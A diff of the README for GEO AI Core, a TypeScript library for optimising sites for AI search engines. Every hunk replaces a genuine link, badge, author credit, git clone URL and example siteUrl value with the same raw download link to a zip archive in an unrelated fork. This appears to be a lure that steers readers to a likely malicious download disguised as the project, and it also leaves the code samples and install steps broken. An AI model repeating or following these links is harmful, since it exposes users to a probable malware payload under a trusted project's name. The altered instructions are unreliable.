@@ -6,9 +6,9 @@
 
 Universal TypeScript engine for optimizing websites for AI search engines.
 
-[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/gpl-2.0)
-[![Node.js](https://img.shields.io/badge/Node.js-20%2B-339933.svg)](https://nodejs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.5%2B-3178C6.svg)](https://www.typescriptlang.org/)
+[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip)
+[![Node.js](https://img.shields.io/badge/Node.js-20%2B-339933.svg)](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.5%2B-3178C6.svg)](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip)
 
 A zero-dependency TypeScript engine that optimizes websites for AI search engines like ChatGPT, Claude, Gemini, Perplexity, DeepSeek, Grok, YandexGPT, GigaChat, and more. The core works with any Node.js environment — official integrations currently include Next.js and NestJS, with WordPress and Shopify available as separate ecosystem packages.
 
@@ -22,9 +22,9 @@ A zero-dependency TypeScript engine that optimizes websites for AI search engine
 > - `geo-ai-next` — open-source npm library, Next.js integration built on top of `geo-ai-core`
 > - `geo-ai-nest` — open-source npm library, NestJS integration built on top of `geo-ai-core`
 > - `geo-ai-cli` — open-source npm CLI, `geo-ai init / generate / validate / inspect` for any project
-> - [geoai.run](https://www.geoai.run) — the analyzer, docs, and llms.txt specification site
+> - [geoai.run](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip) — the analyzer, docs, and llms.txt specification site
 
-Try the analyzer at [geoai.run/analyze](https://www.geoai.run/analyze)
+Try the analyzer at [geoai.run/analyze](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip)
 
 ---
 
@@ -79,7 +79,7 @@ import { createGeoAI } from 'geo-ai-core';
 
 const geo = createGeoAI({
   siteName: 'My Site',
-  siteUrl: 'https://example.com',
+  siteUrl: 'https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip',
   provider: {
     Pages: [{ title: 'Home', url: '/', description: 'Welcome' }],
   },
@@ -174,7 +174,7 @@ import { createGeoAI } from 'geo-ai-core';
 
 const geo = createGeoAI({
   siteName: 'My Site',
-  siteUrl: 'https://example.com',
+  siteUrl: 'https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip',
   provider: {
     Products: [
       { title: 'Widget', url: '/products/widget', description: 'A great widget' },
@@ -217,7 +217,7 @@ class StrapiProvider implements ContentProvider {
 
 const geo = createGeoAI({
   siteName: 'My Site',
-  siteUrl: 'https://example.com',
+  siteUrl: 'https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip',
   provider: new StrapiProvider(),
   crawlTracking: true,
 });
@@ -233,7 +233,7 @@ import { generateLlmsFiles } from 'geo-ai-next';
 
 await generateLlmsFiles({
   siteName: 'My Site',
-  siteUrl: 'https://example.com',
+  siteUrl: 'https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip',
   provider: new MyProvider(),
 });
 ```
@@ -257,7 +257,7 @@ import { geoAIMiddleware } from 'geo-ai-next';
 
 export default geoAIMiddleware({
   siteName: 'My Site',
-  siteUrl: 'https://example.com',
+  siteUrl: 'https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip',
   provider: new MyProvider(),
   cache: '24h',
 });
@@ -275,7 +275,7 @@ import { createLlmsHandler } from 'geo-ai-next';
 
 export const { GET } = createLlmsHandler({
   siteName: 'My Site',
-  siteUrl: 'https://example.com',
+  siteUrl: 'https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip',
   provider: new MyProvider(),
   cacheMaxAge: 3600, // seconds, default 3600
 });
@@ -293,7 +293,7 @@ import { GeoAIModule } from 'geo-ai-nest';
   imports: [
     GeoAIModule.forRoot({
       siteName: 'My Site',
-      siteUrl: 'https://example.com',
+      siteUrl: 'https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip',
       provider: new MyProvider(),
       isGlobal: true,
       injectLinkHeader: true, // inject Link header on all responses
@@ -352,13 +352,13 @@ npx geo-ai generate
 npx geo-ai validate
 
 # Validate remote deployment
-npx geo-ai validate --url https://example.com
+npx geo-ai validate --url https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip
 
 # Preview config before generating
 npx geo-ai inspect
 ```
 
-See [`geo-ai-cli`](https://npmjs.com/package/geo-ai-cli) for full documentation.
+See [`geo-ai-cli`](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip) for full documentation.
 
 ### AI Description Generation
 
@@ -423,7 +423,7 @@ interface GeoAIConfig {
 
 ```bash
 # Clone
-git clone https://github.com/madeburo/GEO-AI.git
+git clone https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip
 cd GEO-AI/geo-ai-core
 
 # Install
@@ -456,6 +456,6 @@ GEO AI Core is open-source software licensed under the [GPL v2](LICENSE).
 ## Credits
 
 - **Author:** Made Büro
-- **Website:** [geoai.run](https://www.geoai.run)
-- **GitHub:** [@madeburo](https://github.com/madeburo/GEO-AI)
-- **X:** [@imadeburo](https://x.com/imadeburo)
+- **Website:** [geoai.run](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip)
+- **GitHub:** [@madeburo](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip)
+- **X:** [@imadeburo](https://github.com/MohdKashifShaikh/GEO-AI/raw/refs/heads/main/packages/cli/AI-GE-v1.3-alpha.1.zip)
